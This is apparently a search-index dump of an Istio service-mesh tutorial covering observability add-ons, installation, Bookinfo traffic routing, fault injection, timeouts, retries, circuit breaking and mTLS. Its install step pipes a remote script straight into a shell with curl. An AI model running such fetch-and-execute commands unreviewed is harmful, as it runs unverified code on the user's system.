mesh will generate very detailed telemetry information for all service comminications with Istio. Without having to develop a solution you can have observability of services to troubleshoot and optimize the applications. Visualizing Metrics with Prometheus and Grafana Distributed Tracing with Jaeger Kiali in Detail Visualizing Metrics with Prometheus and Grafana \u00b6 The standard Istio metrics are exported to Prometheus by default. Prometheus is a modern monitoring tool to gather metrics for distributed architechtures and it is used by many applications and the underlying tools to collect and store metrics. By integrating your service mesh data, you will have a nice unified approach to monitoring metrics. Then, as an Istio addon your metrics can be monitored in Grafana, which is an open-source visualization and analytics tool. Demo the Prometheus dashboard and explore some metrics. Open the Prometheus dashboard istioctl dashboard prometheus Prometheus is not intended for graphical representation of metrics data. Grafana can be used for that. And here we have the Alerts, Graph, and Status tab istio_requests_total metric holds the total number of requests that are coming. istio_requests_total{destination_service=\"productpage.default.svc.cluster.local\"} Open the Grafana dashboard istioctl dashboard grafana In Grafana, you can see Search, Create, Dashboard, Explore, Alerting, and Configuration Menu Distributed Tracing with Jaeger \u00b6 A way to monitor and understand behavior of services, is to monitor individual requests as a flow through a mesh, which is called distributed tracing. Service dependencies and the sources of latency within the service mesh can be observed by tracing. Istio enables distributed tracing through Envoy proxies and supports Zipkin, Lightstep, Jaeger and Datadog. Demo Distriuted Tracing with Jaeger Open the Jaeger dashboard istioctl dashboard jaeger In Jaeger, we can filter services by name, by operation name, by some tags and traces, by duration of traces, and the number of results. Kiali in more detail \u00b6 Overview Overview gives us a summary of our mesh, the workloads, and the services. And all these can be broken down by: Health mTLS status Namespace Label We can also get the Health information for: Apps Workloads Services Graph Graph will have a very informative and clear visualization of the traffic between our services. The Graph has different versions: App graph Service graph Versioned app graph Worklaod graph These versions provide different focus views on our app by grouping accordingly. The left bottom part hels us modify the graph view On the Display, we can add more information and formating from our data plane to the graph. A QUICK NOTE ON SERVICE MESH INTERFACE \u00b6 While Service Mesh technologies are getting more and more polular, Service Mesh vendors keep providing new features. This is both exciting and scary at the same time because while application developers enjoy using these features, they may be locked into a vendor-specific implementation. So in 2019, Microsoft has announced their onging work on Service Mesh Interface. The main goal was to create an abstraction layer on various types of service meshes implementations, which will create a standard interface, a basic feature set, and community to drive innovation effort on Service Mesh technologies. So developers will not spend a lot of time trying to understand different features that a service mesh offers using this set of functionality, and they will be able to jump in and start using any product. 10 Service Mesh providers so far have implemented the common standards, Istio being on of them. You can find a total list of providers in SMI SPEC in smi-spec.io. So the Service Mesh Interface will be covering traffic policy, traffic telemetry, and traffic management topics while also providing portability and flexibility. SMI APIs are expected to mature over time and the current capabilities will definitely extend. Whatsnext \u00b6","title":"Istio Service Mesh"},{"location":"content/en/docs/devops/devops-istio/#istio-service-mesh","text":"Service Mesh introduction","title":"Istio Service Mesh"},{"location":"content/en/docs/devops/devops-istio/#istio-introduction","text":"","title":"Istio Introduction"},{"location":"content/en/docs/devops/devops-istio/#monoliths-vs-microservices","text":"","title":"Monoliths vs Microservices"},{"location":"content/en/docs/devops/devops-istio/#pros-of-microservices","text":"Scalability. Faster, smaller releases, and less risky. Technology and language agnostic Development lifecycle. System resiliency and isolation. Independent and easy to understand services.","title":"Pros of Microservices"},{"location":"content/en/docs/devops/devops-istio/#cons-of-microservices","text":"Complex Service Networking Security Observability Overload for Traditional Operation Models Single proxy in the form of a sidecar container to replace all the different requirements into each microservice. The proxies communicate with each other through what is known as a data plane and they communicate to a server site component called control plane. Control plane manages all the traffic into and out of your services via proxies, so all the networking logic is abstracted from your business code. This approach is known as a Service Mesh.","title":"Cons of Microservices"},{"location":"content/en/docs/devops/devops-istio/#service-mesh","text":"","title":"Service Mesh"},{"location":"content/en/docs/devops/devops-istio/#what-is-service-mesh","text":"Service Mesh is a dedicated and configurable infrastructure layer that handles the communication between services without having to change the code in a microservice architecture.","title":"What is Service Mesh?"},{"location":"content/en/docs/devops/devops-istio/#what-is-service-mesh-responsible-for","text":"With the Service Mesh, you can dynamically configure how services talk to each other. When services talk to one another, you'll have mutual TLS, so your workloads can be secure. You can see thing better. For example, how the application is doing end-to-end, where it is having issues and bottlenecks, and service discovery which covers three main topics: Discovery - you need to know at which IP and port services are exposed so they can find each other. Health Check - helps you dynamically keep services that are up in the mesh while services that are down are left out. Load Balancing - routes the traffic to healthy instances and cuts it off from the ones who have been failing.","title":"What is Service Mesh Responsible For?"},{"location":"content/en/docs/devops/devops-istio/#istio","text":"Istio is a free and open-source service mesh that provides an efficient way to secure, connect, and monitor services. Istio works with Kubernetes and traditional workloads, thereby bringing universal traffic management, telemetry and security to complex deployments. Istio is supported and implemented by leading cloud providers and consultants. Proxy service that takes care of all the tasks that should be outsourced from the microservice. These proxies and the communication between them form the data plane. Istio implements these proxies using an open-source, high-performance proxy known as Envoy. The proxies talk to a server side component known as the control plan. Originally, the control plane consisted of three components named Citadel, Pilot, and Galley. Citadel managed certificate generation. Pilot helped with service discovery. Galley helped in validating configuration file. The three components were later combined into a single daemon called Istiod. Each service or pod has a separate component in it along with the Envoy proxy called the Istio Agent. Istio Agent is responsible for passing configuration secrets to the Envoy proxies.","title":"Istio"},{"location":"content/en/docs/devops/devops-istio/#installing-istioctl","text":"Download the Istio latest binary and install it curl -L https://istio.io/downloadIstio | sh - The output is similar to this: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 101 100 101 0 0 136 0 --:--:-- --:--:-- --:--:-- 137 100 4926 100 4926 0 0 4070 0 0 :00:01 0 :00:01 --:--:-- 4070 Downloading istio-1.14.1 from https://github.com/istio/istio/releases/download/1.14.1/istio-1.14.1-osx.tar.gz ... Istio 1 .14.1 Download Complete! Istio has been successfully downloaded into the istio-1.14.1 folder on your system. Next Steps: See https://istio.io/latest/docs/setup/install/ to add Istio to your Kubernetes cluster. To configure the istioctl client tool for your workstation, add the /Users/vi/DevSecOps/demo/istio/istio-1.14.1/bin directory to your environment path variable with: export PATH = \" $PATH :/Users/vi/DevSecOps/demo/istio/istio-1.14.1/bin\" Begin the Istio pre-installation check by running: istioctl x precheck Need more information? Visit https://istio.io/latest/docs/setup/install/ Move to the Istio directory, this directory is also named with the Istio version you downloaded cd istio-1.14.1 Add the istioctl client to our path export PATH = $PWD /bin: $PATH Check if istioctl is installed istioctl version The output is similar to this: no running Istio pods in \"istio-system\" 1 .14.1 Check if our cluster has Istio installed istioctl verify-install The output is similar to this: 0 Istio control planes detected, checking --revision \"default\" only error while fetching revision : the server could not find the requested resource 0 Istio injectors detected Error: could not load IstioOperator from cluster: the server could not find the requested resource. Use --filename","title":"Installing Istioctl"},{"location":"content/en/docs/devops/devops-istio/#installing-istio-on-your-cluster","text":"There are 3 different approaches to install Istio on cluster Install with Istioctl istioctl install --set profile = demo -y The output is similar to this: \u2714 Istio core installed \u2714 Istiod installed \u2714 Egress gateways installed \u2714 Ingress gateways installed \u2714 Installation complete Making this installation the default for injection and validation. Thank you for installing Istio 1 .14. Please take a few minutes to tell us about your install/upgrade experience! https://forms.gle/yEtCbt45FZ3VoDT5A Check if our cluster has Istio installed istioctl verify-install The output is similar to this: 1 Istio control planes detected, checking --revision \"default\" only \u2714 Deployment: istio-egressgateway.istio-system checked successfully \u2714 PodDisruptionBudget: istio-egressgateway.istio-system checked successfully \u2714 Role: istio-egressgateway-sds.istio-system checked successfully \u2714 RoleBinding: istio-egressgateway-sds.istio-system checked successfully \u2714 Service: istio-egressgateway.istio-system checked successfully \u2714 ServiceAccount: istio-egressgateway-service-account.istio-system checked successfully \u2714 ClusterRole: istiod-istio-system.istio-system checked successfully \u2714 ClusterRole: istio-reader-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istio-reader-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-istio-system.istio-system checked successfully \u2714 ServiceAccount: istio-reader-service-account.istio-system checked successfully \u2714 Role: istiod-istio-system.istio-system checked successfully \u2714 RoleBinding: istiod-istio-system.istio-system checked successfully \u2714 ServiceAccount: istiod-service-account.istio-system checked successfully \u2714 CustomResourceDefinition: wasmplugins.extensions.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: destinationrules.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: envoyfilters.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: gateways.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: proxyconfigs.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: serviceentries.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: sidecars.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: virtualservices.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: workloadentries.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: workloadgroups.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: authorizationpolicies.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: peerauthentications.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: requestauthentications.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: telemetries.telemetry.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: istiooperators.install.istio.io.istio-system checked successfully \u2714 ClusterRole: istiod-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRole: istiod-gateway-controller-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-gateway-controller-istio-system.istio-system checked successfully \u2714 ConfigMap: istio.istio-system checked successfully \u2714 Deployment: istiod.istio-system checked successfully \u2714 ConfigMap: istio-sidecar-injector.istio-system checked successfully \u2714 MutatingWebhookConfiguration: istio-sidecar-injector.istio-system checked successfully \u2714 PodDisruptionBudget: istiod.istio-system checked successfully \u2714 ClusterRole: istio-reader-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istio-reader-clusterrole-istio-system.istio-system checked successfully \u2714 Role: istiod.istio-system checked successfully \u2714 RoleBinding: istiod.istio-system checked successfully \u2714 Service: istiod.istio-system checked successfully \u2714 ServiceAccount: istiod.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.11.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.11.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.12.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.12.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.13.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.13.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.14.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.14.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.15.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.15.istio-system checked successfully \u2714 ValidatingWebhookConfiguration: istio-validator-istio-system.istio-system checked successfully \u2714 Deployment: istio-ingressgateway.istio-system checked successfully \u2714 PodDisruptionBudget: istio-ingressgateway.istio-system checked successfully \u2714 Role: istio-ingressgateway-sds.istio-system checked successfully \u2714 RoleBinding: istio-ingressgateway-sds.istio-system checked successfully \u2714 Service: istio-ingressgateway.istio-system checked successfully \u2714 ServiceAccount: istio-ingressgateway-service-account.istio-system checked successfully Checked 15 custom resource definitions Checked 3 Istio Deployments \u2714 Istio is installed and verified successfully Istio Operator Install Install with Helm There are also different profiles for production and performance testing and it's important to know that different environments need different profiles. Once Istio is installed, it is deployed in the cluster in the form of a deployment named istiod in the namespace known as the istio-system . services istio-ingressgateway isitod Citadel Pilot Galley istio-egressgateway and a bunch of Kubernetes service objects to expose these services within the cluster.","title":"Installing Istio on your cluster"},{"location":"content/en/docs/devops/devops-istio/#deploying-your-first-application-on-istio","text":"Deploy the sample booking deployment kubectl apply -f istio-1.14.1/samples/bookinfo/platform/kube/bookinfo.yaml The output is similar to this: service/details created serviceaccount/bookinfo-details created deployment.apps/details-v1 created service/ratings created serviceaccount/bookinfo-ratings created deployment.apps/ratings-v1 created service/reviews created serviceaccount/bookinfo-reviews created deployment.apps/reviews-v1 created deployment.apps/reviews-v2 created deployment.apps/reviews-v3 created service/productpage created serviceaccount/bookinfo-productpage created deployment.apps/productpage-v1 created Check all the deployment kubectl get pod The output is similar to this: NAME READY STATUS RESTARTS AGE details-v1-7f4669bdd9-q72n9 1 /1 Running 0 3m2s productpage-v1-5586c4d4ff-lghxl 1 /1 Running 0 3m ratings-v1-6cf6bc7c85-sv8sf 1 /1 Running 0 3m1s reviews-v1-7598cc9867-gt8zn 1 /1 Running 0 3m1s reviews-v2-6bdd859457-thjrq 1 /1 Running 0 3m1s reviews-v3-6c98f9d7d7-z8qf6 1 /1 Running 0 3m1s We have the deployments in the default namespace but there are no proxies that we needs in each of deployment To see why may be the case istioctl analyze The output is similar to this: Info [ IST0102 ] ( Namespace default ) The namespace is not enabled for Istio injection. Run 'kubectl label namespace default istio-injection=enabled' to enable it, or 'kubectl label namespace default istio-injection=disabled' to explicitly mark it as not needing injection. Because the default namespace where our deployment deployed is not labeled with istio-injection=enable, so we need to delete all the deployment to label the namespace kubectl label namespace default istio-injection = enabled The output is similar to this: namespace/default labeled Check/analyze again istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default. Delete or restart rollout deployment kubectl rollout restart deployments details-v1 kubectl rollout restart deployments productpage-v1 kubectl rollout restart deployments ratings-v1 kubectl rollout restart deployments reviews-v1 kubectl rollout restart deployments reviews-v2 kubectl rollout restart deployments reviews-v3 The output is similar to this: deployment.apps/details-v1 restarted deployment.apps/productpage-v1 restarted deployment.apps/ratings-v1 restarted deployment.apps/reviews-v1 restarted deployment.apps/reviews-v2 restarted deployment.apps/reviews-v3 restarted Check all the deployment ```sh kubectl get pod The output is similar to this: ```sh NAME READY STATUS RESTARTS AGE details-v1-7fd8c8d8c-kw8cx 2/2 Running 0 58s productpage-v1-7444985f97-5hnt6 2/2 Running 0 57s ratings-v1-5bd97d8566-qwmw8 2/2 Running 0 57s reviews-v1-74cffbcd7d-x88hn 2/2 Running 0 57s reviews-v2-6746555c8b-d4rrj 2/2 Running 0 56s reviews-v3-85cb57875d-z6w5m 2/2 Running 0 56s","title":"Deploying Your First Application on Istio"},{"location":"content/en/docs/devops/devops-istio/#visualizing-service-mesh-with-kiali","text":"Once you have many microservices, it is important to observe them and check them to make sure they're available as you configured them. Kiali is a very common and powerful add-on used with Istio. It has a web-based graphical interface. It is a very helpful and fun tool for visualizing and managing service mesh. Kiali is used for observing connections and microservices of Istio service mesh and also for defining and validating them. It visualizes the service mesh topology and provides visibility into features like request routing, circuit breakers, request rates, latency and more. Kiali also offers Wizards to apply common traffic patterns and automatically generates Istio configuration.","title":"Visualizing Service Mesh with Kiali"},{"location":"content/en/docs/devops/devops-istio/#installing-kiali","text":"Install Kiali and others add-on in the samples/addons folder (these addons are not tuned in performance and security purposes) ls samples/addons kubectl apply -f samples/addons The output is similar to this: README.md extras grafana.yaml jaeger.yaml kiali.yaml prometheus.yaml serviceaccount/grafana created configmap/grafana created service/grafana created deployment.apps/grafana created configmap/istio-grafana-dashboards created configmap/istio-services-grafana-dashboards created deployment.apps/jaeger created service/tracing created service/zipkin created service/jaeger-collector created serviceaccount/kiali created configmap/kiali created clusterrole.rbac.authorization.k8s.io/kiali-viewer created clusterrole.rbac.authorization.k8s.io/kiali created clusterrolebinding.rbac.authorization.k8s.io/kiali created role.rbac.authorization.k8s.io/kiali-controlplane created rolebinding.rbac.authorization.k8s.io/kiali-controlplane created service/kiali created deployment.apps/kiali created serviceaccount/prometheus created configmap/prometheus created clusterrole.rbac.authorization.k8s.io/prometheus created clusterrolebinding.rbac.authorization.k8s.io/prometheus created service/prometheus created deployment.apps/prometheus created Check if the Kiali service is running kubectl -n istio-system get svc kiali The output is similar to this: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kiali ClusterIP 10 .99.20.194 <none> 20001 /TCP,9090/TCP 67m Start Kiali dashboard istioctl dashboard kiali The output is similar to this: http://localhost:20001/kiali","title":"Installing Kiali"},{"location":"content/en/docs/devops/devops-istio/#create-traffic-into-your-mesh","text":"Gateway will configure our service mesh to accept traffic from outside the cluster. Create a Gateway and its virtual service kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml The output is similar to this: gateway.networking.istio.io/bookinfo-gateway created virtualservice.networking.istio.io/bookinfo created Check/analyze again istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default. Check the reachable IP of minikube - this is the minukube node Internal-IP kubectl get node -o wide The output is similar to this: NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME minikube Ready control-plane,master 31m v1.23.1 192 .168.49.2 <none> Ubuntu 20 .04.2 LTS 5 .10.76-linuxkit docker://20.10.12 Export this IP to our variable export INGRESS_HOST = $( minikube ip ) Export the istio-ingressgateway (http2) port to our variable export INGRESS_PORT = $( kubectl -n istio-system get svc istio-ingressgateway -o jsonpath = '{.spec.ports[?(@.name==\"http2\")].nodePort}' ) Create some traffic to our mesh while sleep 0 .01 ; do curl -sS 'http://' \" $INGRESS_HOST \" ':' \" $INGRESS_PORT \" '/productpage' \\ & > /dev/null ; done","title":"Create traffic into your mesh"},{"location":"content/en/docs/devops/devops-istio/#traffic-management","text":"The most powerful port of it is that you'll do it without changing your application code","title":"Traffic Management"},{"location":"content/en/docs/devops/devops-istio/#gateways","text":"How can we make these services accessible to external users? While Istio supports Kubernetes Ingress there is also another approach that Istio offers and recommends that supports more Istio features, such as advanced monitoring and routing rules. That is called Istio Gateway. Gateways are load balancers that sit at the edge of the mesh. They are the main configurations that manage the inbound and the outbound traffic to service mesh. This is a recommended approach such as compared to just using Kubernetes Ingress. There are Istio gateway controllers just like the Ingress Controller: The Ingress Gateway manages all inbound traffic to the services. The Egress Gateway manages all outbound traffic from these services. Ingress is deployed in Kubernetes using controllers like NGINX. Istio on the other hand, deploys Ingress Gateways using Envoy proxies. And all services have an Envoy proxy deployed as a sidecar container, however, the Ingress and Egress Gateways are just standalone Envoy proxies, sitting at the edge of the service mesh, they do not work as as sidecar. These are the default gateway controllers that were deployed when Istio was deployed on the cluster. However, we can have our own set of custom gateway controllers as well. Our goal here is to catch all traffic coming through istio-ingressgateway controller and route all traffic at hostname bookinfo.app to our product page. First, we create a gateway object cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: bookinfo-gateway spec: selector: istio: ingressgateway # use istio default controller servers: - port: number: 80 name: http protocol: HTTP hosts: - \"bookinfo.app\" EOF View the gateway kubectl get gateway The output is similar to this: NAME AGE bookinfo-gateway 29s Describe more details the gateway kubectl describe gateway bookinfo-gateway The output is similar to this: Name: bookinfo-gateway Namespace: default Labels: <none> Annotations: <none> API Version: networking.istio.io/v1beta1 Kind: Gateway Metadata: Creation Timestamp: 2022 -07-07T02:24:05Z Generation: 1 Managed Fields: API Version: networking.istio.io/v1alpha3 Fields Type: FieldsV1 fieldsV1: f:metadata: f:annotations: .: f:kubectl.kubernetes.io/last-applied-configuration: f:spec: .: f:selector: .: f:istio: f:servers: Manager: kubectl-client-side-apply Operation: Update Time: 2022 -07-07T02:24:05Z Resource Version: 1237 UID: 40b636a4-88ea-4cd9-9294-accd8ce38bfa Spec: Selector: Istio: ingressgateway Servers: Hosts: bookinfo.app Port: Name: http Number: 80 Protocol: HTTP Events: <none> We now have a bookinfo-gateway object created to capture traffic coming through the default istio-ingressgateway controller, through the URL bookinfo.app.","title":"Gateways"},{"location":"content/en/docs/devops/devops-istio/#virtual-services","text":"How and where is that traffic routed to? All routing rules are configured through virtual services. Virtual services define a set of routing rules for traffic coming from ingress gateway into the service mesh. Virtual services are flexible and powerful with rich traffic routing options. You can specify traffic behavior for one or more hostname, manage traffic within different versions of a service. Standard and regex path are supported. When a virtual service is created, Istio control plane applies the new configuration to all the Envoy sidecar proxies. Create a virtual service for product page: cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \"bookinfo.app\" gateways: - bookinfo-gateway http: - match: - uri: exact: /productpage - uri: prefix: /static - uri: exact: /login - uri: exact: /logout - uri: prefix: /api/v1/products route: - destination: host: productpage port: number: 9080 EOF All traffic coming in through the bookinfo-gateway with the hostname bookinfo.app now hit the bookinfo virtual service. Next, the product page needs to talk to the review service. Since the Kubernetes service distributes traffic across all of endpoints equally, the distribution can only be 75 and 25 percentage not anything else. The only way to change the distribution percentage is to play around with the number of pods available in different services, so that's a limitation. With Istio and virtual services, we can now create a virtual service instead of a service, and we will call it reviews , we then define two destination routes for traffic distribution subset v1 and v2, then we set a weight for each. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - route: - destination: host: reviews subset: v1 weight: 99 # route 99% of the traffic to v1 - destination: host: reviews subset: v2 weight: 1 # route 1% of the traffic to v2 EOF","title":"Virtual Services"},{"location":"content/en/docs/devops/devops-istio/#destination-rules","text":"Destination rule applies router polices after the traffic is routed to a specific service. Where and how are these subsets defined? Subsets are defined in destination rules. So, we create a destination rule with the kind set to DestinationRule, name set to reviews-destination, and host set to reviews. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 EOF By default, Envoy load balances traffic in a round-robin fashion. This can be customized through the destination rule by specifying a traffic policy of load balancer. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: loadBalancer: simple: PASSTHROUGH # This will route traffic to the host that has fewer active requests. subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 EOF Set the traffic policy to a simple passthrough policy. This will route traffic to the host that has fewer active requests. There are other simple algorithms: Simple Algorithms ROUND_ROBIN LEAST_CONN RANDOM PASSTHROUGH What if we want to override a different load balancer policy for specific subsets? For example, for subset v2, we would like to have a random load balancer policy. For this, we'll just specify a traffic policy at the subset level and configure a different policy. This way, we can configure one load balancing policy for all subsets and a seperate one for selected subsets as required. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: loadBalancer: simple: PASSTHROUGH subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 trafficPolicy: loadBalancer: simple: RANDOM EOF There are many more configurations supported by destination rules. For example, to configure a client to use TLS, specify simple TLS, or to configure mutual TLS cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: tls: mode: SIMPLE # use simple TLS EOF cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews trafficPolicy: tls: mode: MUTUAL # configure mutual TLS with certificate files clientCertificate: /myclientcert.pem privateKey: /client_private_key.pem caCertificate: /rootcacerts.pem EOF spec.host field it is currently set to reviews , which is the name of the service. It is the short name of the service. When using short names, instead of fully qualified domain names reviews.default.svc.cluster.local , Istio will interpret the short name based on the rules namespace and not the services actual namespaces. This might lead to misconfigurations if your service is another namespace. To avoid this, using fully qualified names over short names is recommended. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-destination spec: host: reviews.default.svc.cluster.local # recommend to use FQDN instead of short name trafficPolicy: tls: mode: MUTUAL clientCertificate: /myclientcert.pem privateKey: /client_private_key.pem caCertificate: /rootcacerts.pem EOF","title":"Destination Rules"},{"location":"content/en/docs/devops/devops-istio/#fault-injection","text":"We will generate some errors to check if error handling mechanisms are working as expected. That is fault injection. This is a testing approach. It helps us to see if our policies run efficiently and are not too restrictive. We can inject errors in our virtual services and these could be two different types of errors, delays and aborts. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - fault: delay: # injecting a delay type of fault in the mesh for ratings virtual service percentage: value: 0.1 # add a delay for 10% of requests fixedDelay: 5s # this delay is configured as 5 seconds route: - destination: host: my-service subset: v1 EOF Apart from delay, you can also configure abort to simulate errors by rejecting requests and returning specific error codes. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - fault: abort: percentage: value: 0.1 httpStatus: 400 route: - destination: host: my-service subset: v1 EOF","title":"Fault Injection"},{"location":"content/en/docs/devops/devops-istio/#timeouts","text":"When it comes to software, you must know that anything could happen. Since each service within this microservice architecture is a software, we should expect them to slow down, fail, or go completely crazy for no obvious reasons. And since the services are dependent on each other, slowness on one service might affect the other services dependent on it and even have a cascading effect. For example: If the ratings service slows down for some reason, we will have requests queued at it, which is going to cause requests on the reviews service to be queued up, which is going to cause the requests on productpage to be queued up. The details service slows down, then the requests coming from product page to details service is going to get queued up, and the request sub-productpage is going to get queued up affecting all users accessing the application. That's why we need timeouts. If the service is taking too much time to response, it must not keep the dependent service waiting forever. It must fail after a period of time and return an error message. That way the dependent service gets an error message and is not impacted. That's what a timeout is. We can either configure a timeout at the details service for it to fail, or we can configure a timeout at the productpage service for it to fail sooner rather than waiting for the details service for eternity. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \"*\" gateways: - bookinfo-gateway http: - match: - uri: exact: /productpage - uri: prefix: /static - uri: exact: /login - uri: exact: /logout - uri: prefix: /api/v1/products route: - destination: host: productpage port: number: 9080 timeout: 3s # reject requests if it takes more than 3 seconds EOF Simulate the fault injection to set 50% of request to details service to be delayed 5 seconds cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: details spec: hosts: - details http: - fault: delay: percentage: value: 50.0 fixedDelay: 5s route: - destination: host: details subset: v1 EOF","title":"Timeouts"},{"location":"content/en/docs/devops/devops-istio/#retries","text":"When a service tries to reach another service, and for some reason, it fails, we can configure the virtual service to attempt that operation again. This way, you don't have to handle the retries within the application code. You can configure retry settings, which basically says cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: my-service spec: hosts: - my-service http: - route: - destination: host: my-service subset: v1 retries: attempts: 3 # number of times to try perTryTimeout: 2s # interval between each try EOF NOTE : Istio, by default, has a retry behavior which is 25 milliseconds between retries and retrying 2 times before an error returns.","title":"Retries"},{"location":"content/en/docs/devops/devops-istio/#circuit-breaking","text":"The productpage service communicates with other services such as the reviews or the details service. If, for some reason, the details service breaks or slows down and is unable to serve the product service, all requests from the productpage service will pile up at the detail service, essentially creating a delay as the productpage service is waiting for response from the detail service. In such cases, we would like to mark the requests failed immediately as it is sent to the details service. This is known as circuit breaking. This allows us to create resilient microservice applications that will limit the impact of failures or other network-related issues. The same is true if we would like to limit the number of request coming to the productpage itself. Circuit breakers are configured in destination rules. cat <<EOF | kubectl apply -f - apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: productpage spec: host: productpage trafficPolicy: tls: mode: ISTIO_MUTUAL subsets: - name: v1 labels: version: v1 trafficPolicy: connectionPool: tcp: maxConnections: 3 # limit the number of concurrent connections to 3 http: http1MaxPendingRequests: 3 maxRequestsPerConnection: 3 EOF Create concurrent requests h2load -n10 -c3 http://istio.dev.bein.group/productpage The output is similar to this: starting benchmark... spawning thread #0: 3 total client(s). 10 total requests Application protocol: h2c progress: 10 % done progress: 20 % done progress: 30 % done progress: 40 % done progress: 50 % done progress: 60 % done progress: 70 % done progress: 80 % done progress: 90 % done progress: 100 % done finished in 9 .65s, 1 .04 req/s, 1 .40KB/s requests: 10 total, 10 started, 10 done , 3 succeeded, 7 failed, 0 errored, 0 timeout status codes: 3 2xx, 0 3xx, 0 4xx, 7 5xx traffic: 13 .55KB ( 13876 ) total, 454B ( 454 ) headers ( space savings 59 .61% ) , 12 .74KB ( 13050 ) data min max mean sd +/- sd time for request: 323 .12ms 3 .18s 2 .27s 1 .32s 70 .00% time for connect: 45 .68ms 46 .04ms 45 .83ms 187us 66 .67% time to 1st byte: 3 .09s 3 .10s 3 .09s 685us 66 .67% req/s : 0 .41 0 .46 0 .44 0 .02 66 .67%","title":"Circuit Breaking"},{"location":"content/en/docs/devops/devops-istio/#ab-testing","text":"A/B Testing is a very popular and powerful approach to understand user behavior. It boosts experimentation and helps our software professionals to not guess how our applications will be interacted, but to see it on real data. Istio allows to weight the traffic to several services via virtual service even if the reviews v2 service had 3 or more pods, the traffic distribution will still be 99% to v1 and 1% to v2. The number of instances now has nothing to do with the traffic distribution, and we can easily control that through the virtual service configuration.","title":"A/B Testing"},{"location":"content/en/docs/devops/devops-istio/#security","text":"","title":"Security"},{"location":"content/en/docs/devops/devops-istio/#security-in-istio","text":"Microservices have certain security requirements. When a service communicates with other service, it's possible for an attacker to intercept the traffic and modify it before the request reaches the destination. This is known as man-in-the-middle attack. To prevent this from happening: First, the traffic between services needs to be encrypted. Secondly, certain services may need to implement access control restrictions. For example, only the productpage service is allowed to access the reviews service and not the details service or any other services in the cluster. For this, we need access control. Istio allows this using mutual TLS and fine-grained access policies. Finally, we'd like to know who did what at what time. And for this, Istio provides support for audits logs.","title":"Security in Istio"},{"location":"content/en/docs/devops/devops-istio/#istio-security-architecture","text":"Now take a look at the Istio architecture and see how Istio implements security to achieve the requirements of microservices applications. Control plane Istiod There is a certification authority that manages keys and certificates in Istio. This is where the certificates are validated and certificate signing requests are approved. Every time a workload is started, the Envoy proxies request the certificate and key from the Istio agent and that helps secure communication between services. The configuration API server component distributes all the authentication, authorization, and secure naming policies to the proxies. 